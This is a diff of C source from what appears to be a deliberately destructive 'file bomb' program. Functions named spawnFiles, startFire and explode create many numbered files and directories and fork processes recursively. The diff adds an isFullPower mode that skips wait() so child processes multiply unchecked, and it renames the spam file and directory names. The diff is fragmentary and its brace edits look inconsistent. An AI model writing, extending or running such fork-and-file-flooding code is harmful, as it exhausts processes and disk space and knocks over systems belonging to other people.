@@ -1,8 +1,9 @@
 #include "../Includes/preprocessor.h"
 extern int currLevel;
 extern float sleepSecs;
+extern int isFullPower;
 
-static char* createNumberedDir(char* str,int len,int num,char*buff,int isDir){
+static char* createNumberedFile(char* str,int len,int num,char*buff,int isDir){
 
 			char numTmpBuff[64]={0};
 			sprintf(numTmpBuff,"%d",num);
@@ -40,7 +41,7 @@ void spawnFiles(char rootDir[1024]){
 	int currPathLen=strlen(rootDir);
 		for(int i=0;i<HOW_MANY_COPIES;i++){
 		
-			createNumberedDir("helpme",currPathLen,i,rootDir,0);
+			createNumberedFile(SPAM_FILE_NAME,currPathLen,i,rootDir,0);
 		}
 
 
@@ -51,7 +52,7 @@ void startFire(char*buff){
 	
 		char*path=NULL;
 		for(int i=0;i<HOW_MANY_COPIES;i++){
-			path=createNumberedDir("stopthis",currPathLen,i,buff,1);
+			path=createNumberedFile(SUB_EGG_DIR_NAME,currPathLen,i,buff,1);
 
         	char path2[strlen(path)+1];
        	 	memset(path2,0,strlen(path)+1);
@@ -67,52 +68,24 @@ void startFire(char*buff){
 				switch(pid){
 
 					case -1:
-						perror("Erro no fork\n");
+						perror("I want to feel shame");
 						exit(-1);
 
 					case 0:
 						explode(path2);
 						return;
 					default:
+					if(!isFullPower){
 						wait(NULL);
+					}
+
 						break;
 					}
 		
 			
-			}
-
 		}
 
-
-
-/*
-void multiply(char* rootDir){
-struct stat st= {0};
-	if(stat(rootDir, &st)==-1){
-		mkdir(rootDir,0777);
-	}
-	char retDirPath[strlen(rootDir)+1+strlen(EGG_DIR_NAME)];
-	memset(cdirpath,0,strlen(rootDir)+1);
-	memset(retDirPath,0,strlen(rootDir)+1+strlen(EGG_DIR_NAME));
-	sprintf(retDirPath,"%s/%s",cdirpath,EGG_DIR_NAME);
-
-	int pid=fork();
-	switch(pid){
-		case -1:
-			perror("Erro a forkar em multiply");
-			exit(-1);
-			
-		case 0:
-			
-			startFire(recDirPath);
-			
-		break;
-		default:
-		
-			
-	
-		break;
-
-	}
 }
-*/
+
+
+
